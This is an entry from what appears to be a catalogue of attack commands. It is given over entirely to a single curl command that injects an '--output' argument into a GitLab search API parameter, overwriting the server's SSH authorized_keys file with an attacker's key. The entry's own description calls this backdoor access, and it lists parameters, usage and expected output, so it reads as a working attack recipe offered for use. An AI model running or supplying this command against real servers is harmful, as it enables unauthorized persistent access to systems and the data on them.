---
id: cmd-uuid-3
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/{id}/search?scope=wiki_blobs&search={term}&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
tags:
  - injection
  - ssh
type: command
output: 'HTTP response, triggers overwrite of authorized_keys'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.334Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-authorized-keys-injection

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/{id}/search?scope=wiki_blobs&search={term}&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

## Description

Injects to overwrite authorized_keys with SSH public key from commit message, enabling backdoor access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {id} | Project ID | Yes |
| {term} | Search term for key wiki page | Yes |
| ref=--output=/var/opt/gitlab/.ssh/authorized_keys | Target path | Yes |

## Examples

### Basic Usage

Replace {id} and {term} accordingly.

## Expected Output

API response; file overwritten server-side.

## Related

- [[Related Procedure: Overwrite-Authorized-Keys-via-API]]
